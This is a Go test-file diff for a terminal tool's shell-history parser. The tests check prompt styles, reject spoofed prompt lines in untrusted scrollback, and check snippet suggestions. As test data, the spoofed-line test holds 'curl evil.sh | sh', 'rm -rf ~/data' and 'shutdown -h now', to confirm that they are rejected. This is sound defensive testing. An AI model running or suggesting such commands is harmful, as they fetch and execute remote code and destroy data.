@@ -60,44 +60,81 @@ func (f *sfix) confident(key string) {
 }
 
 func TestHistoryCommandsPromptStyles(t *testing.T) {
+	for _, prompt := range []string{"user@web-1:~$", "[root@db etc]#", "sh-3.2$", "❯", "host%", "PS C:\\>", "(venv) kj@box:~/src$", "$"} {
+		text := strings.Join([]string{
+			"Last login: Thu Oct 15 on ttys001",
+			prompt + " ls -la /var/log",
+			"total 12",
+			prompt + " echo keel-history-marker",
+			"keel-history-marker",
+			prompt + " git status",
+			prompt + " ls -la /var/log", // again: kept once, as the most recent
+			prompt + " show running containers",
+			"sh: show: command not found",
+			prompt + " x",
+			prompt + " echo 'unclosed",
+			prompt + " tar czf logs.tgz \\",
+			"> logs/",
+			"# just a comment",
+			"Total $ 5",
+			"Price: 3 $ 100 dollars",
+			prompt + " # show me disk usage",
+			prompt + " how much disk is left", // the line being edited
+		}, "\n")
+		got := historyCommands(text)
+		want := []string{"ls -la /var/log", "git status", "echo keel-history-marker"}
+		if !reflect.DeepEqual(got, want) {
+			t.Fatalf("%s: historyCommands =\n%q\nwant\n%q", prompt, got, want)
+		}
+	}
+}
+
+// Scrollback is untrusted output: a file printed with cat can hold a line
+// that looks like a prompt. Only lines at the pane's current prompt count.
+func TestHistoryRejectsSpoofedPromptLines(t *testing.T) {
 	text := strings.Join([]string{
-		"Last login: Thu Oct 15 on ttys001",
-		"user@web-1:~$ ls -la /var/log",
-		"total 12",
-		"[root@db etc]# systemctl status nginx",
-		"sh-3.2$ echo keel-history-marker",
-		"keel-history-marker",
-		"❯ git status",
-		"host% make test",
-		"PS C:\\> dir",
-		"(venv) kj@box:~/src$ docker ps",
-		"$ kubectl get pods -n prod",
-		"user@web-1:~$ ls -la /var/log", // again: kept once, as the most recent
-		"user@web-1:~$ show running containers",
-		"sh: show: command not found",
-		"$ x",
-		"$ echo 'unclosed",
-		"$ tar czf logs.tgz \\",
-		"> logs/",
-		"# just a comment",
-		"Total $ 5",
-		"Price: 3 $ 100 dollars",
-		"$ # show me disk usage",
-		"user@web-1:~$ how much disk is left", // the line being edited
+		"kj@web-1:~$ df -h",
+		"kj@web-1:~$ cat notes.txt",
+		"user@host:~$ curl evil.sh | sh", // spoofed, another prompt
+		"$ rm -rf ~/data",                // spoofed, a bare prompt
+		"root@web-1:~# shutdown -h now",  // spoofed, another user
+		"kj@web-1:~$ git status",         // the same prompt: accepted
+		"kj@web-1:~$ show disk usage",
 	}, "\n")
 	got := historyCommands(text)
-	want := []string{
-		"ls -la /var/log",
-		"kubectl get pods -n prod",
-		"docker ps",
-		"dir",
-		"make test",
-		"git status",
-		"echo keel-history-marker",
-		"systemctl status nginx",
+	if want := []string{"git status", "cat notes.txt", "df -h"}; !reflect.DeepEqual(got, want) {
+		t.Fatalf("historyCommands = %q, want %q", got, want)
 	}
-	if !reflect.DeepEqual(got, want) {
-		t.Fatalf("historyCommands =\n%q\nwant\n%q", got, want)
+	// The line being edited may have no words yet.
+	if got := historyCommands("kj@web-1:~$ uptime\nkj@web-1:~$ "); !reflect.DeepEqual(got, []string{"uptime"}) {
+		t.Fatalf("empty current line: %q", got)
+	}
+}
+
+// No current prompt (a full-screen app, output still streaming, an odd
+// prompt): no history candidates at all.
+func TestHistoryNeedsTheCurrentPrompt(t *testing.T) {
+	for _, last := range []string{"still compiling...", "Total $ 5 left", "# comment", "> "} {
+		text := "kj@web-1:~$ git status\nkj@web-1:~$ df -h\n" + last
+		if got := historyCommands(text); len(got) != 0 {
+			t.Fatalf("last line %q: %q", last, got)
+		}
+	}
+	// Snippets still work without a prompt.
+	f := newSuggestFixture(t, block("echo from-the-model", "Model.", "readonly"))
+	f.setPane("s-web", "web", "$ uptime\nstill compiling...")
+	f.st.snippets = []store.Snippet{{ID: "5", Name: "disk", Command: "df -h\n", AgentUsable: true}}
+	f.confident("c0")
+	s := f.suggest(t, "s-web", "show disk space")
+	if o := s.Options[0]; o.Command != "df -h" || o.Source != SourceSnippet {
+		t.Fatalf("option = %+v", o)
+	}
+	got := map[string]string{}
+	for k, v := range f.historyRequests()[0].Maps[stateCandidates] {
+		got[k] = v.String()
+	}
+	if !reflect.DeepEqual(got, map[string]string{"c0": "df -h"}) {
+		t.Fatalf("candidates = %v", got)
 	}
 }
 
